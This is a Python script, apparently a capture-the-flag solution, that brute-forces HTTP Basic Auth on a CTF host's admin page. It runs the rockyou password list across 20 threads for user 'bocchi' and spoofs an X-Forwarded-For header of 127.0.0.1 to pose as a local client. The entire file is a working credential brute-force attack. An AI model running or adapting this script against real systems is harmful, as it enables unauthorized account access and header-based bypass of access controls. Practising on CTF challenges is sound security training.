import requests
import numpy as np
import threading
from tqdm import tqdm
tn = 20
lines =[item.strip() for item in open(
    "./debug/rockyou.txt", "r", encoding="latin-1").readlines()]

print(len(lines))
splits = np.array_split(lines, tn)
pbar = tqdm(total=len(lines))


def request(i):
    lines = splits[i]
    for idx, pw in enumerate(lines):
        #print(pw)
        r = requests.get('http://ctf.adl.tw:12002/admin',
                         headers={"X-Forwarded-For": "127.0.0.1",
                                  "User-Agent": "STARRYBrowser",
                                  "Accept-Language": "ja-JP"}, auth=("bocchi", pw))
        if len(r.text) != 1370:
            print(pw)
            with open('./debug/pw.txt', 'w') as f:
                f.write(pw)
            #break
            exit()
        #if idx % 100 == (100 * i) / tn:
        if idx % 100 == 0:
            pbar.update(100)


for i in range(tn):
    t = threading.Thread(target=request, args=(i,))
    t.start()